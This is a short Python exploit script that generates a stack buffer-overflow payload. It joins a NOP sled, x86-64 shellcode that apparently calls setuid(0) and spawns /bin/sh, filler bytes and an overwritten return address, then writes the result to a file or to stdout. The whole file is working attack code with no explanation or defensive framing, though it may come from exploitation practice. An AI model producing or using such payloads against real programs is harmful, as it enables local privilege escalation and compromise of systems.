import sys
import struct

if len(sys.argv)<3:
	print("Usage: python3 loader.py <bytes> <address> [<path>]")
	sys.exit(1)

bytes = int(sys.argv[1])
addr = int(sys.argv[2],16)
outfile=None
if len(sys.argv)==4:
	outfile = sys.argv[3]
	print(f"Preparing a payload of {bytes} bytes and a pointer to {hex(addr)} and storing in {outfile}.")
else:
	print(f"Preparing a payload of {bytes} and a pointer to {hex(addr)}.")

nops= b'\x90'*30

shellcode = b"\x48\x31\xff\xb0\x69\x0f\x05\x48\x31\xd2\x48\xbb\xff\x2f\x62\x69\x6e\x2f\x73\x68\x48\xc1\xeb\x08\x53\x48\x89\xe7\x48\x31\xc0\x50\x57\x48\x89\xe6\xb0\x3b\x0f\x05\x6a\x01\x5f\x6a\x3c\x58\x0f\x05"

buf = b"A"*(bytes-len(nops)-len(shellcode))
buf += b"BBBBBBBB"
#rip = b"CCCCCC"

data = nops+shellcode+buf+struct.pack('<Q',addr)
if outfile:
	with open(outfile,'wb') as f:
		f.write(data)	
else:
	sys.stdout.buffer.write(data)

